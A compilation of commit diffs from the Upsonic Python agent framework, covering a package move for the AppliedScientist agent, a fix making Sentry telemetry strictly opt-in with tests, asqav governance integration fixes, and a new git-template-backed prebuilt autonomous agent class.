+from typing import TYPE_CHECKING, Any
+
+if TYPE_CHECKING:
+    from .agent import (
+        AppliedScientist,
+        Experiment,
+        ExperimentRecord,
+        ExperimentRegistry,
+        ExperimentResult,
+    )
+
+
+def _get_classes() -> dict[str, Any]:
+    from .agent import (
+        AppliedScientist,
+        Experiment,
+        ExperimentRecord,
+        ExperimentRegistry,
+        ExperimentResult,
+    )
+    return {
+        "AppliedScientist": AppliedScientist,
+        "Experiment": Experiment,
+        "ExperimentRecord": ExperimentRecord,
+        "ExperimentRegistry": ExperimentRegistry,
+        "ExperimentResult": ExperimentResult,
+    }
+
+
+def __getattr__(name: str) -> Any:
+    classes = _get_classes()
+    if name in classes:
+        return classes[name]
+    raise AttributeError(
+        f"module '{__name__}' has no attribute '{name}'. "
+        f"Available: {list(classes.keys())}"
+    )
+
+
+__all__ = [
+    "AppliedScientist",
+    "Experiment",
+    "ExperimentRecord",
+    "ExperimentRegistry",
+    "ExperimentResult",
+]
```

**File**: `src/upsonic/prebuilt/applied_scientist/agent.py` (renamed, +13/-14)
```diff
@@ -1,11 +1,11 @@
 """
-Upsonic-maintained prebuilt autonomous agents.
+Applied scientist prebuilt autonomous agent.
 
-Each class in this module wires
-:class:`~upsonic.agent.prebuilt_autonomous_agent.PrebuiltAutonomousAgent` to a
-specific upstream template repo/folder and exposes a high-level,
-template-aware API (``new_experiment()``, ``new_task()``, etc.) so users do
-not have to remember the placeholders in ``first_message.md``.
+Wires :class:`~upsonic.prebuilt.prebuilt_agent_base.PrebuiltAutonomousAgentBase`
+to the ``applied_scientist`` template directory shipped under ``template/``
+inside this package and exposes a high-level, template-aware API
+(``new_experiment()``) so users do not have to remember the placeholders in
+``first_message.md``.
 """
 from __future__ import annotations
 
@@ -14,9 +14,7 @@
 from pathlib import Path
 from typing import Any, Dict, Iterator, List, Optional, TYPE_CHECKING, Union
 
-from upsonic.agent.prebuilt_autonomous_agent.prebuilt_autonomous_agent import (
-    PrebuiltAutonomousAgent,
-)
+from upsonic.prebuilt.prebuilt_agent_base import PrebuiltAutonomousAgentBase
 
 if TYPE_CHECKING:
     from upsonic.models import Model
@@ -121,7 +119,7 @@ def run(
     ) -> str:
         """
         Execute the experiment with pretty terminal output (calls
-        :meth:`PrebuiltAutonomousAgent.run_console`). Blocks until the run
+        :meth:`PrebuiltAutonomousAgentBase.run_console`). Blocks until the run
         completes and returns the concatenated assistant text.
         """
         if self._started:
@@ -985,10 +983,11 @@ def __repr__(self) -> str:
 # --------------------------------------------------------------------------- #
 
 
-class AppliedScientist(PrebuiltAutonomousAgent):
+class AppliedScientist(PrebuiltAutonomousAgentBase):
     """
-    Prebuilt "applied scientist" agent backed by
-    ``Upsonic/AutonomousAgents/applied_scientist``.
+    Prebuilt "applied scientist" agent backed by the
+    ``src/upsonic/prebuilt/applied_scientist/template`` directory of the
+    Upsonic repo.
 
     The agent repo and folder are hard-coded, so callers only supply model and
     workspace. Each experiment is created via :meth:`new_experiment` and then
@@ -1006,7 +1005,7 @@ class AppliedScientist(PrebuiltAutonomousAgent):
     """
 
     AGENT_REPO: str = "https://github.com/Upsonic/Upsonic"
-    AGENT_FOLDER: str = "prebuilt_autonomous_agents/applied_scientist"
+    AGENT_FOLDER: str = "src/upsonic/prebuilt/applied_scientist/template"
 
     def __init__(
         self,
```

---

### Incident Patch 9: `8365a223` (2026-05-01)
**Commit Message**: fix(telemetry): make Sentry strictly opt-in (#583)

* fix(telemetry): make Sentry strictly opt-in (TECH-1428)

Previously upsonic.utils.logging_config called sentry_sdk.init() at import
time with a hard-coded default DSN, replacing the host application's
global Sentry client and shipping error logs to upsonic's project by
default. The bundled LoggingIntegration also monkey-patched
logging.Logger.callHandlers, which broke Temporal workflow sandboxes
([TMPRL1101] _DeadlockError).

Telemetry is now strictly opt-in via enable_telemetry(dsn=...). The DSN
default is removed, sentry_sdk.init() is never called, and an isolated
Client + Scope pair is used (Hub(client) was unsuitable in sentry-sdk 2.x
because its ctor mutates the global isolation scope). LoggingIntegration
is no longer registered, so host logging is left untouched.

Co-Authored-By: Claude Opus 4.7 (1M context) <[REDACTED_EMAIL]>

* chore: sync uv.lock with asqav extra from pyproject.toml

The asqav optional dependency was added to pyproject.toml in PR #564
but uv.lock was not regenerated, so every uv run produced a dirty
working tree. Regenerated via uv lock.

Co-Authored-By: Claude Opus 4.7 (1M context) <[REDACTED_EMAIL]>



**File**: `src/upsonic/utils/logging_config.py` (modified, +166/-107)
```diff
@@ -12,10 +12,14 @@
     UPSONIC_DISABLE_LOGGING: Tüm logging'i kapat (true/false)
     UPSONIC_DISABLE_CONSOLE_LOGGING: Console logging'i kapat (user-facing apps için)
 
-    # Sentry Telemetry Configuration (ERROR-ONLY by default for performance):
-    UPSONIC_TELEMETRY: Sentry DSN (ya da "false" to disable)
+    # Sentry Telemetry Configuration (STRICTLY OPT-IN):
+    # Telemetry is fully disabled unless the host explicitly sets a DSN.
+    # There is no default DSN — upsonic never ships data to a third party
+    # by default, and never calls sentry_sdk.init() (so the host's own
+    # Sentry configuration is never replaced).
+    UPSONIC_TELEMETRY: Sentry DSN (must be explicitly set; "false" or unset disables)
     UPSONIC_ENVIRONMENT: Environment name (production, development, staging)
-    UPSONIC_SENTRY_SAMPLE_RATE: Traces sample rate (0.0 - 1.0, default: 0.0 for performance)
+    UPSONIC_SENTRY_SAMPLE_RATE: Traces sample rate (0.0 - 1.0, default: 0.0)
     UPSONIC_SENTRY_PROFILE_SESSION_SAMPLE_RATE: Profile sample rate (0.0 - 1.0, default: 0.0)
 
     # Modül bazlı seviye kontrolü:
@@ -25,44 +29,59 @@
     UPSONIC_LOG_LEVEL_AGENT: Sadece agent için
 
 Kullanım:
-    # Otomatik konfigürasyon (import ederken çalışır)
-    from upsonic.utils.logging_config import setup_logging, sentry_sdk
+    from upsonic.utils.logging_config import setup_logging, enable_telemetry
 
-    # Ya da manuel
+    # Logging
     setup_logging(level="DEBUG", log_file="upsonic.log")
 
-    # Sentry tracing kullanımı
-    with sentry_sdk.start_transaction(op="task", name="My Task"):
-        # your code here
-        pass
-
-    # Environment variable ile
-    export UPSONIC_LOG_LEVEL=DEBUG
-    export UPSONIC_TELEMETRY="your-sentry-dsn"
-    export UPSONIC_ENVIRONMENT="production"
+    # Telemetry (opt-in)
+    enable_telemetry(dsn="https://...@sentry.io/123")
+    # or set UPSONIC_TELEMETRY env var and call enable_telemetry() with no args
 """
 
 import logging
 import os
 import sys
 import atexit
-from typing import Optional, Dict, Literal, Any
+from typing import Optional, Dict, Literal, Any, TYPE_CHECKING
 from pathlib import Path
-from dotenv import load_dotenv
+import dotenv
+
+if TYPE_CHECKING:  # for type hints only — never executed at runtime
+    import sentry_sdk
+
+# NOTE: ``sentry_sdk`` is intentionally NOT imported at module top-level.
+# Importing it here would pull the entire Sentry SDK (and its transitive
+# integrations) into every worker that touches upsonic, even when telemetry
+# is disabled. The module-level ``__getattr__`` below performs a lazy import
+# on first attribute access, and ``enable_telemetry()`` reaches the module
+# through that same channel (so existing ``patch(...sentry_sdk)`` tests keep
+# working without modification).
+
+
+def __getattr__(name: str) -> Any:
+    """Lazy module attribute access.
+
+    Defers ``import sentry_sdk`` until something actually reads the
+    ``sentry_sdk`` attribute on this module. Result is cached in module
+    globals so subsequent accesses are free.
+    """
+    if name == "sentry_sdk":
+        import sentry_sdk as _sentry_sdk  # local import — runs once
+        globals()["sentry_sdk"] = _sentry_sdk
+        return _sentry_sdk
+    raise AttributeError(f"module {__name__!r} has no attribute {name!r}")
 
-# Sentry SDK imports
-import sentry_sdk
-from sentry_sdk.integrations.logging import LoggingIntegration
 
 # Load environment variables from current working directory (where user runs their script)
 # This ensures .env is found even when package is installed in site-packages
 cwd = Path(os.getcwd())
 env_path = cwd / ".env"
 if env_path.exists():
-    load_dotenv(env_path, override=False)
+    dotenv.load_dotenv(env_path, override=False)
 else:
     # Fallback: search from current directory upwards (default behavior)
-    load_dotenv(override=False)
+    dotenv.load_dotenv(override=False)
 
 # Log level mapping
 LOG_LEVELS = {
@@ -97,6 +116,13 @@
 _LOGGING_CONFIGURED = False
 _SENTRY_CONFIGURED = False
 
+# Isolated Sentry state for upsonic. We deliberately do NOT mutate the global
+# sentry_sdk hub/scope (no sentry_sdk.init() and no Hub() construction — Hub's
+# 2.x ctor mutates the global isolation scope). capture_exception() routes
+# through this private Scope instead of the global one.
+_upsonic_client: "Optional[sentry_sdk.Client]" = None
+_upsonic_scope: "Optional[sentry_sdk.Scope]" = None
+
 
 def get_env_log_level(key: str, default: str = "INFO") -> int:
     """
@@ -133,110 +159,143 @@ def get_env_bool_optional(key: str) -> "Optional[bool]":
     return value_lower in ("true", "1", "yes", "on")
 
 
-def setup_sentry() -> None:
+def enable_telemetry(
+    dsn: Optional[str] = None,
+    environment: Optional[str] = None,
+    sample_rate: Optional[float] = None,
+    profile_session_sample_rate: Optional[float] = None,
+) -> bool:
     """
-    Sentry telemetry sistemini yapılandır (ERROR-ONLY mode by default).
+    Explicit opt-in for upson
```

**File**: `tests/unit_tests/test_logging_config.py` (modified, +28/-13)
```diff
@@ -105,21 +105,24 @@ def test_setup_sentry_disabled(self, mock_sentry):
     @patch('upsonic.utils.logging_config.sentry_sdk')
     @patch('upsonic.utils.logging_config.atexit.register')
     def test_setup_sentry_enabled(self, mock_atexit, mock_sentry):
-        """Test setup_sentry when telemetry is enabled."""
+        """Test setup_sentry uses an isolated Client (not sentry_sdk.init())."""
         os.environ["UPSONIC_TELEMETRY"] = "https://test@sentry.io/123"
 
-        # Force reconfiguration
         from upsonic.utils import logging_config
         logging_config._SENTRY_CONFIGURED = False
+        logging_config._upsonic_client = None
+        logging_config._upsonic_scope = None
 
         setup_sentry()
 
-        # Sentry should be initialized with DSN
-        mock_sentry.init.assert_called_once()
-        call_kwargs = mock_sentry.init.call_args[1]
+        # init() must NEVER be called — that would replace the host's Sentry client.
+        mock_sentry.init.assert_not_called()
+        # An isolated Client must be constructed with the configured DSN.
+        mock_sentry.Client.assert_called_once()
+        call_kwargs = mock_sentry.Client.call_args[1]
         self.assertEqual(call_kwargs['dsn'], "https://test@sentry.io/123")
 
-        # atexit handler should be registered
+        # Flush handler is registered for graceful shutdown.
         mock_atexit.assert_called_once()
 
     def test_setup_logging_basic(self):
@@ -280,49 +283,61 @@ def tearDown(self) -> None:
 
     @patch('upsonic.utils.logging_config.sentry_sdk')
     def test_sentry_environment_config(self, mock_sentry: MagicMock) -> None:
-        """Test Sentry environment configuration."""
+        """Test Sentry config flows through to the isolated Client."""
         os.environ["UPSONIC_TELEMETRY"] = self._TEST_DSN
         os.environ["UPSONIC_ENVIRONMENT"] = "development"
         os.environ["UPSONIC_SENTRY_SAMPLE_RATE"] = "0.5"
 
         from upsonic.utils import logging_config
         logging_config._SENTRY_CONFIGURED = False
+        logging_config._upsonic_client = None
+        logging_config._upsonic_scope = None
 
         setup_sentry()
 
-        mock_sentry.init.assert_called_once()
-        call_kwargs = mock_sentry.init.call_args[1]
+        mock_sentry.init.assert_not_called()
+        mock_sentry.Client.assert_called_once()
+        call_kwargs = mock_sentry.Client.call_args[1]
         self.assertEqual(call_kwargs['dsn'], self._TEST_DSN)
         self.assertEqual(call_kwargs['environment'], "development")
         self.assertEqual(call_kwargs['traces_sample_rate'], 0.5)
 
     @patch('upsonic.utils.logging_config.sentry_sdk')
     @patch('upsonic.utils.package.system_id.get_system_id')
     def test_sentry_user_id_tracking(self, mock_get_system_id: MagicMock, mock_sentry: MagicMock) -> None:
-        """Test Sentry user ID tracking."""
+        """User ID is set on the isolated Scope, not the global SDK."""
         os.environ["UPSONIC_TELEMETRY"] = self._TEST_DSN
         mock_get_system_id.return_value = "test-system-id-123"
 
         from upsonic.utils import logging_config
         logging_config._SENTRY_CONFIGURED = False
+        logging_config._upsonic_client = None
+        logging_config._upsonic_scope = None
 
         setup_sentry()
 
-        mock_sentry.set_user.assert_called_once_with({"id": "test-system-id-123"})
+        # Global sentry_sdk.set_user must NOT be touched (would mutate host scope).
+        mock_sentry.set_user.assert_not_called()
+        # The isolated scope receives the user id.
+        scope_instance = mock_sentry.Scope.return_value
+        scope_instance.set_user.assert_called_once_with({"id": "test-system-id-123"})
 
     @patch('upsonic.utils.logging_config.sentry_sdk')
     @patch('upsonic.utils.package.system_id.get_system_id')
     def test_sentry_user_id_failure_graceful(self, mock_get_system_id: MagicMock, mock_sentry: MagicMock) -> None:
-        """Test Sentry handles system ID failure gracefully."""
+        """A failing get_system_id() must not block Client construction."""
         os.environ["UPSONIC_TELEMETRY"] = self._TEST_DSN
         mock_get_system_id.side_effect = Exception("System ID error")
 
         from upsonic.utils import logging_config
         logging_config._SENTRY_CONFIGURED = False
+        logging_config._upsonic_client = None
+        logging_config._upsonic_scope = None
 
         setup_sentry()
 
-        mock_sentry.init.assert_called_once()
+        mock_sentry.init.assert_not_called()
+        mock_sentry.Client.assert_called_once()
 
 
 if __name__ == '__main__':
```

**File**: `tests/unit_tests/test_telemetry_optin.py` (added, +412/-0)
```diff
@@ -0,0 +1,412 @@
+"""
+TECH-1428: Tests for opt-in telemetry behavior.
+
+The previous behavior had three problems:
+  1. `setup_sentry()` ran at import time, calling `sentry_sdk.init()` and
+     replacing the host application's global Sentry client.
+  2. The DSN defaulted to upsonic's own Sentry project, so any host that
+     didn't explicitly opt out shipped error logs to a third party.
+  3. `LoggingIntegration` was registered globally, monkey-patching
+     `logging.Logger.callHandlers` and breaking sandboxed environments
+     such as Temporal workflows.
+
+Fix surface:
+  * Importing `upsonic.utils.logging_config` MUST NOT call `sentry_sdk.init`.
+  * `setup_sentry()` is now a no-op when `UPSONIC_TELEMETRY` is unset; there
+    is no default DSN.
+  * `enable_telemetry(dsn=...)` is the explicit opt-in entry point and
+    constructs an isolated `sentry_sdk.Client` bound to a local `Hub` —
+    it never calls `sentry_sdk.init()`.
+  * No `LoggingIntegration` is registered.
+  * `capture_exception()` routes through the isolated hub, never the global
+    one.
+"""
+
+import importlib
+import logging
+import os
+import sys
+import unittest
+from unittest.mock import MagicMock, patch
+
+
+def _reset_logging_config_state() -> None:
+    """Reset module-level flags so each test starts from a clean slate."""
+    from upsonic.utils import logging_config
+
+    logging_config._SENTRY_CONFIGURED = False
+    logging_config._upsonic_client = None
+    logging_config._upsonic_scope = None
+
+
+class TestNoImportTimeSideEffects(unittest.TestCase):
+    """Importing the module must not touch the global Sentry SDK.
+
+    These tests run in subprocesses so the fresh-import behavior can be
+    observed without polluting sys.modules for sibling test files (which
+    would leave their top-level ``from upsonic.utils.logging_config
+    import ...`` references bound to an orphan module).
+    """
+
+    def _run_in_subprocess(self, script: str) -> "subprocess.CompletedProcess":
+        import subprocess
+
+        env = os.environ.copy()
+        env.pop("UPSONIC_TELEMETRY", None)
+        # Bypass the repo's .env, which sets UPSONIC_TELEMETRY=false and
+        # would mask the bug we are reproducing.
+        env["DOTENV_DISABLE"] = "1"
+        return subprocess.run(
+            [sys.executable, "-c", script],
+            env=env,
+            capture_output=True,
+            text=True,
+            timeout=30,
+            check=False,
+        )
+
+    def test_importing_module_does_not_call_sentry_init(self) -> None:
+        """Re-importing logging_config must not invoke sentry_sdk.init().
+
+        The original bug shipped a hard-coded default DSN, so even a host
+        that never set UPSONIC_TELEMETRY had its global Sentry client
+        silently replaced.
+        """
+        result = self._run_in_subprocess(
+            "import sys; "
+            "from unittest.mock import patch; "
+            # Stub load_dotenv so the repo's .env cannot reintroduce
+            # UPSONIC_TELEMETRY=false (which would mask the bug).
+            "patch('dotenv.load_dotenv').start(); "
+            "init_calls = []; "
+            "import sentry_sdk; "
+            "sentry_sdk.init = lambda *a, **kw: init_calls.append((a, kw)); "
+            "import upsonic.utils.logging_config; "
+            "print(f'INIT_CALLS={len(init_calls)}')"
+        )
+        self.assertEqual(result.returncode, 0, msg=f"stderr: {result.stderr}")
+        self.assertIn("INIT_CALLS=0", result.stdout)
+
+    def test_importing_module_does_not_register_logging_integration(self) -> None:
+        """No LoggingIntegration may be installed at import time."""
+        result = self._run_in_subprocess(
+            "import sys; "
+            "from unittest.mock import patch; "
+            "patch('dotenv.load_dotenv').start(); "
+            "calls = []; "
+            "import sentry_sdk.integrations.logging as li; "
+            "_orig = li.LoggingIntegration; "
+            "li.LoggingIntegration = lambda *a, **kw: calls.append((a, kw)) or _orig(*a, **kw); "
+            "import upsonic.utils.logging_config; "
+            "print(f'INTEGRATION_CALLS={len(calls)}')"
+        )
+        self.assertEqual(result.returncode, 0, msg=f"stderr: {result.stderr}")
+        self.assertIn("INTEGRATION_CALLS=0", result.stdout)
+
+
+class TestSentrySdkLazyImport(unittest.TestCase):
+    """sentry_sdk must not be loaded into sys.modules until first use.
+
+    Even when telemetry is disabled, the previous code paid the cost of
+    importing the entire Sentry SDK (and its transitive integrations) in
+    every worker. The lazy ``__getattr__`` defers that cost until something
+    actually reads ``logging_config.sentry_sdk``.
+
+    Each test runs in a fresh subprocess so reimport state pollution can
+    never leak into other tests in this file.
+    """
+
+    def _run_in_subprocess(self, script: str) -> "subprocess.CompletedProcess":
+        import 
```

**File**: `uv.lock` (modified, +14/-1)
```diff
@@ -338,6 +338,15 @@ wheels = [
     { url = "https://files.pythonhosted.org/packages/75/7c/9607852e2bb324fa40a5b967e162dea1b3c76b429cf90b602e4a202c101a/apify_shared-2.2.0-py3-none-any.whl", hash = "sha256:667d4d00ac3cf8091702640547387ac5c72a1df402bbb3923f7a401bc25d9d50", size = 16408, upload-time = "2026-01-15T10:17:13.103Z" },
 ]
 
+[[package]]
+name = "asqav"
+version = "0.3.1"
+source = { registry = "https://pypi.org/simple/" }
+sdist = { url = "https://files.pythonhosted.org/packages/fb/98/caa933c09c5585546d952274f3faec9392223a3b0de17e0dbec06b156ab5/asqav-0.3.1.tar.gz", hash = "sha256:75b9e00498ef5a338faf2d2757928d25e07476494d141f1a120602ae49156640", size = 62867, upload-time = "2026-04-29T21:05:42.133Z" }
+wheels = [
+    { url = "https://files.pythonhosted.org/packages/7b/cc/d688857eeecec9bdfd7b50989355b9f5e4e6a8c655736b9e7d928ec2b274/asqav-0.3.1-py3-none-any.whl", hash = "sha256:160474187a952ad00fafa8a2610d4a992f4568823bdd312e88095662f4b9bfe9", size = 77544, upload-time = "2026-04-29T21:05:40.513Z" },
+]
+
 [[package]]
 name = "async-timeout"
 version = "5.0.1"
@@ -8856,6 +8865,9 @@ dependencies = [
 apify-tool = [
     { name = "apify-client" },
 ]
+asqav = [
+    { name = "asqav" },
+]
 chroma = [
     { name = "chromadb", marker = "python_full_version < '3.14'" },
 ]
@@ -9129,6 +9141,7 @@ requires-dist = [
     { name = "anyio", marker = "extra == 'models'", specifier = ">=4.10.0" },
     { name = "apify-client", marker = "extra == 'apify-tool'", specifier = ">=1.8.1" },
     { name = "apify-client", marker = "extra == 'custom-tools'", specifier = ">=1.8.1" },
+    { name = "asqav", marker = "extra == 'asqav'", specifier = ">=0.2.21" },
     { name = "asyncpg", marker = "extra == 'postgres-storage'", specifier = ">=0.30.0" },
     { name = "azure-core", marker = "extra == 'embeddings'", specifier = ">=1.35.1" },
     { name = "azure-core", marker = "extra == 'models'", specifier = ">=1.35.1" },
@@ -9291,7 +9304,7 @@ requires-dist = [
     { name = "xai-sdk", marker = "extra == 'models'", specifier = ">=1.4.0" },
     { name = "yfinance", marker = "extra == 'tools'", specifier = ">=0.2.66" },
 ]
-provides-extras = ["chroma", "qdrant", "milvus", "weaviate", "pinecone", "faiss", "pgvector", "supermemory", "vectordb", "sqlite-storage", "redis-storage", "postgres-storage", "mongo-storage", "mem0-storage", "storage", "models", "embeddings", "csv-loader", "docling-loader", "docx-loader", "html-loader", "json-loader", "markdown-loader", "pdf-loader", "pdfplumber-loader", "pymupdf-loader", "text-loader", "xml-loader", "yaml-loader", "loaders", "tools", "web", "ocr", "custom-tools", "apify-tool", "crawlee-browser", "gmail-interface", "safety-engine", "slack-interface", "mail-interface", "discord-interface", "otel", "langfuse", "gmail-tool"]
+provides-extras = ["asqav", "chroma", "qdrant", "milvus", "weaviate", "pinecone", "faiss", "pgvector", "supermemory", "vectordb", "sqlite-storage", "redis-storage", "postgres-storage", "mongo-storage", "mem0-storage", "storage", "models", "embeddings", "csv-loader", "docling-loader", "docx-loader", "html-loader", "json-loader", "markdown-loader", "pdf-loader", "pdfplumber-loader", "pymupdf-loader", "text-loader", "xml-loader", "yaml-loader", "loaders", "tools", "web", "ocr", "custom-tools", "apify-tool", "crawlee-browser", "gmail-interface", "safety-engine", "slack-interface", "mail-interface", "discord-interface", "otel", "langfuse", "gmail-tool"]
 
 [package.metadata.requires-dev]
 dev = [
```

---

### Incident Patch 10: `0e4f371d` (2026-04-27)
**Commit Message**: fix: asqav integration bugs

- init asqav before super().__init__ so signing exporter binds to live agent
- pass base_url=None when no endpoint set so SDK keeps /api/v1 default
- fix InMemorySpanExporter import path
- raise on init/export errors instead of swallowing silently
- classify spans by OTel GenAI attrs, not substring match on name
- scope export_audit_json/csv to this provider's agent_id by default
- add [asqav] optional extra

**File**: `pyproject.toml` (modified, +3/-0)
```diff
@@ -43,6 +43,9 @@ dependencies = [
 ]
 
 [project.optional-dependencies]
+asqav = [
+    "asqav>=0.2.21",
+]
 chroma = [
     "chromadb>=1.0.20; python_version < '3.14'",
 ]
```

**File**: `src/upsonic/integrations/asqav.py` (modified, +204/-96)
```diff
@@ -12,20 +12,23 @@
     agent = Agent("openai/gpt-4o", instrument=gov)
     agent.print_do("Analyze quarterly revenue data")
 
-    # Export audit trail
+    # Export audit trail (raises on backend errors so you can debug)
     gov.export_audit_json()
 """
 
 from __future__ import annotations
 
+import logging
 import os
-from typing import Any, Optional, TYPE_CHECKING
+from typing import Any, Callable, Dict, Optional, Tuple, TYPE_CHECKING
 
 from upsonic.integrations.tracing import TracingProvider
 
 if TYPE_CHECKING:
     from opentelemetry.sdk.trace.export import SpanExporter as _SpanExporter
 
+_logger = logging.getLogger(__name__)
+
 
 class AsqavGovernance(TracingProvider):
     """Asqav governance integration for Upsonic agents.
@@ -37,14 +40,22 @@ class AsqavGovernance(TracingProvider):
 
     Args:
         api_key: Asqav API key (``sk_...``).
-            Falls back to ``ASQAV_API_KEY`` env var.
+            Falls back to the ``ASQAV_API_KEY`` env var. If neither is set
+            the constructor raises (use a stub provider if you really want
+            unsigned tracing).
         agent_name: Name for the asqav agent identity.
-            Defaults to ``"upsonic-agent"``.
-        endpoint: Asqav API endpoint.
-            Falls back to ``ASQAV_API_URL`` env var.
-        sign_tool_calls: Sign individual tool call spans.
-        sign_llm_calls: Sign LLM invocation spans.
-        sign_agent_steps: Sign agent reasoning steps.
+            Defaults to ``"upsonic-agent"``. Reused on subsequent runs;
+            asqav returns the existing agent for the same name.
+        endpoint: Override for the asqav API base URL.
+            Falls back to the ``ASQAV_API_URL`` env var. When neither is
+            set the asqav SDK keeps its own (correct) default —
+            ``https://api.asqav.com/api/v1``. Don't hardcode
+            ``https://api.asqav.com`` here: that strips the ``/api/v1``
+            path and breaks every SDK call.
+        sign_tool_calls: Sign spans that look like real tool invocations
+            (per OTel GenAI semantic conventions).
+        sign_llm_calls: Sign spans that look like real LLM invocations.
+        sign_agent_steps: Sign generic agent / pipeline-step spans.
         include_content: Include prompt/response content in traces.
         service_name: Service name reported in traces.
     """
@@ -61,143 +72,240 @@ def __init__(
         include_content: bool = True,
         service_name: str = "upsonic",
     ) -> None:
-        self._api_key = api_key or os.environ.get("ASQAV_API_KEY", "")
-        self._agent_name = agent_name
-        self._endpoint = endpoint or os.environ.get(
-            "ASQAV_API_URL", "https://api.asqav.com"
-        )
-        self._sign_tool_calls = sign_tool_calls
-        self._sign_llm_calls = sign_llm_calls
-        self._sign_agent_steps = sign_agent_steps
-
-        self._asqav = None
-        self._agent = None
-        self._session = None
+        # Resolve api_key from param → env var. Empty string is treated
+        # the same as missing; the asqav SDK will surface a clear
+        # AuthenticationError from _init_asqav() below.
+        self._api_key: Optional[str] = api_key or os.environ.get("ASQAV_API_KEY") or None
+        self._agent_name: str = agent_name
+        # Endpoint: pass-through. ``None`` lets the asqav SDK use its own
+        # correct default which already includes ``/api/v1``.
+        self._endpoint: Optional[str] = endpoint or os.environ.get("ASQAV_API_URL") or None
+        self._sign_tool_calls: bool = sign_tool_calls
+        self._sign_llm_calls: bool = sign_llm_calls
+        self._sign_agent_steps: bool = sign_agent_steps
+
+        self._asqav: Any = None
+        self._agent: Any = None
+        self._session: Any = None
+
+        # Initialize asqav BEFORE super().__init__() because the parent's
+        # __init__ calls _setup() → _create_exporter(), which builds the
+        # signing exporter. The exporter needs ``self._agent`` to already
+        # exist; otherwise the constructor's ordering would silently
+        # capture ``None`` and zero spans would ever be signed.
+        self._init_asqav()
 
         super().__init__(
             service_name=service_name,
             include_content=include_content,
         )
 
-        self._init_asqav()
-
     def _init_asqav(self) -> None:
-        """Initialize asqav client and agent."""
+        """Initialize the asqav client and create the agent identity.
+
+        Raises:
+            ImportError: when the ``asqav`` package isn't installed.
+            asqav.AuthenticationError: when ``api_key`` is missing or invalid.
+            asqav.APIError: when the asqav backend rejects the call (e.g.,
+                wrong endpoint, missing scope, server error). These were
+                previously swallowed by a bare ``except Exception: pass``
+                that left users with a "tracer" that silently never signed.
+        """
    
```

---

### Incident Patch 11: `270cb482` (2026-04-24)
**Commit Message**: docs: fix Cowork capitalization per review

**File**: `README.md` (modified, +1/-1)
```diff
@@ -22,7 +22,7 @@
 
 ## Overview
 
-Upsonic is a Python framework for building autonomous agents like OpenClaw and Claude CoWork, as well as more traditional agent systems.
+Upsonic is a Python framework for building autonomous agents like OpenClaw and Claude Cowork, as well as more traditional agent systems.
 
 ## Quick Start
 
```

---

### Incident Patch 12: `65850886` (2026-04-21)
**Commit Message**: feat: added prebuilt agent, AppliedScientist (#568)

**File**: `src/upsonic/__init__.py` (modified, +6/-0)
```diff
@@ -96,6 +96,9 @@ def _get_RalphLoop():
 def _get_AutonomousAgent():
     return _lazy_import("upsonic.agent.autonomous_agent.autonomous_agent", "AutonomousAgent")()
 
+def _get_PrebuiltAutonomousAgent():
+    return _lazy_import("upsonic.agent.prebuilt_autonomous_agent.prebuilt_autonomous_agent", "PrebuiltAutonomousAgent")()
+
 def hello() -> str:
     return "Hello from upsonic!"
 
@@ -129,6 +132,8 @@ def __getattr__(name: str) -> Any:
         return _get_RalphLoop()
     elif name == "AutonomousAgent":
         return _get_AutonomousAgent()
+    elif name == "PrebuiltAutonomousAgent":
+        return _get_PrebuiltAutonomousAgent()
     
     # All other imports must come from sub-modules
     raise AttributeError(
@@ -144,6 +149,7 @@ def __getattr__(name: str) -> Any:
     "Clanker",
     "Agent",
     "AutonomousAgent",
+    "PrebuiltAutonomousAgent",
     "Graph",
     "Team",
     "Chat",
```

**File**: `src/upsonic/agent/prebuilt_autonomous_agent/__init__.py` (added, +39/-0)
```diff
@@ -0,0 +1,39 @@
+"""
+Prebuilt Autonomous Agent module for the Upsonic AI Agent Framework.
+
+Extends :class:`~upsonic.agent.autonomous_agent.AutonomousAgent` to bootstrap
+its system prompt and first message from a git repo subfolder and expose
+run / run_async / run_stream / run_stream_async / run_console entry points.
+"""
+from __future__ import annotations
+
+from typing import TYPE_CHECKING, Any
+
+if TYPE_CHECKING:
+    from .prebuilt_autonomous_agent import PrebuiltAutonomousAgent
+
+
+def _get_classes() -> dict[str, Any]:
+    """Lazy import of prebuilt autonomous agent classes."""
+    from .prebuilt_autonomous_agent import PrebuiltAutonomousAgent
+
+    return {
+        "PrebuiltAutonomousAgent": PrebuiltAutonomousAgent,
+    }
+
+
+def __getattr__(name: str) -> Any:
+    """Lazy loading of prebuilt autonomous agent classes."""
+    classes = _get_classes()
+    if name in classes:
+        return classes[name]
+
+    raise AttributeError(
+        f"module '{__name__}' has no attribute '{name}'. "
+        f"Available: {list(classes.keys())}"
+    )
+
+
+__all__ = [
+    "PrebuiltAutonomousAgent",
+]
```

**File**: `src/upsonic/agent/prebuilt_autonomous_agent/prebuilt_autonomous_agent.py` (added, +660/-0)
```diff
@@ -0,0 +1,660 @@
+"""
+Prebuilt Autonomous Agent.
+
+A thin subclass of :class:`AutonomousAgent` that bootstraps its
+``system_prompt.md`` and ``first_message.md`` from a remote git repository
+subfolder, copies user inputs into the workspace, and renders the first
+message from a ``str.format`` template.
+
+The main entry points are:
+
+- :meth:`PrebuiltAutonomousAgent.run` — run to completion and return result.
+- :meth:`PrebuiltAutonomousAgent.run_async` — async variant of ``run``.
+- :meth:`PrebuiltAutonomousAgent.run_stream` — yield text chunks live.
+- :meth:`PrebuiltAutonomousAgent.run_stream_async` — async variant of stream.
+- :meth:`PrebuiltAutonomousAgent.run_console` — pretty terminal output with
+  tool calls, results, and streamed text.
+"""
+from __future__ import annotations
+
+import asyncio
+import shutil
+import string
+import subprocess
+import tempfile
+from pathlib import Path
+from typing import (
+    Any,
+    AsyncIterator,
+    Dict,
+    Iterator,
+    List,
+    Optional,
+    Set,
+    Union,
+    TYPE_CHECKING,
+)
+
+from upsonic.agent.autonomous_agent.autonomous_agent import AutonomousAgent
+from upsonic.agent.autonomous_agent.filesystem_toolkit import AutonomousFilesystemToolKit
+from upsonic.agent.autonomous_agent.shell_toolkit import AutonomousShellToolKit
+
+if TYPE_CHECKING:
+    from upsonic.tasks.tasks import Task
+
+
+class PrebuiltAutonomousAgent(AutonomousAgent):
+    """
+    Autonomous agent whose system prompt and first message come from a git repo.
+
+    Constructor stores the repo coordinates; every call to :meth:`run`,
+    :meth:`run_stream`, or :meth:`run_console` performs a fresh shallow
+    ``git sparse-checkout`` of ``agent_folder`` into ``workspace``, so the
+    workspace always reflects the current state of the remote template.
+
+    ``workspace`` can be set either at construction time or per-run. If omitted
+    at both, a :class:`ValueError` is raised when the agent is invoked.
+
+    Example:
